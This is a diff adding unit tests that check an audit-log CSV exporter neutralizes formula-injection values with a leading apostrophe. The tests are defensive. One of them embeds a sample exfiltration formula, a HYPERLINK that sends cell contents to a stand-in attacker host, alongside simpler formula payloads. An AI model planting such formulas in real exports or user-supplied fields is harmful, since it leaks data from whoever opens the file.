@@ -42,6 +42,43 @@ describe('auditEntriesToCsv', () => {
     expect(row).toContain('"note,with""quote"'); // comma+quote wrapped, quote doubled
   });
 
+  // CWE-1236 (theo-cloud#157): audit fields are user-authored (project names,
+  // emails, resource ids) and the export is opened by a privileged owner. A
+  // value starting with =/+/-/@/tab/CR is a live formula in Excel/Sheets —
+  // neutralize it with a leading apostrophe BEFORE RFC-4180 quoting.
+  it('neutralizes leading formula chars to prevent CSV injection', () => {
+    const cases: Array<[string, string]> = [
+      ['=1+1', "'=1+1"],
+      ['+2', "'+2"],
+      ['-3', "'-3"],
+      ['@cmd', "'@cmd"],
+      ['\tx', "'\tx"],
+    ];
+    for (const [raw, want] of cases) {
+      const e = { action: raw, timestamp: '2026-07-03T10:00:00Z' } as AuditEntry;
+      const cell = auditEntriesToCsv([e]).split('\r\n')[1].split(',')[2];
+      expect(cell).toBe(want);
+    }
+  });
+
+  it('neutralizes a realistic HYPERLINK exfil payload', () => {
+    const e = {
+      action: '=HYPERLINK("http://evil.example/?d="&A1,"click")',
+      timestamp: '2026-07-03T10:00:00Z',
+    } as AuditEntry;
+    const row = auditEntriesToCsv([e]).split('\r\n')[1];
+    // apostrophe-guarded (inert) and RFC-quoted for the embedded comma+quotes;
+    // the cell is never a bare leading '='.
+    expect(row).toContain(`"'=HYPERLINK`);
+    expect(row).not.toContain(',=HYPERLINK');
+  });
+
+  it('leaves benign values unchanged (no spurious apostrophe)', () => {
+    const e = { action: 'deploy.created', actor: 'paulo@x.com', timestamp: 't' } as AuditEntry;
+    const row = auditEntriesToCsv([e]).split('\r\n')[1];
+    expect(row).toBe('t,paulo@x.com,deploy.created,,,,');
+  });
+
   it('falls back to legacy ts / actor_email when canonical fields absent', () => {
     const e = {
       action: 'x',
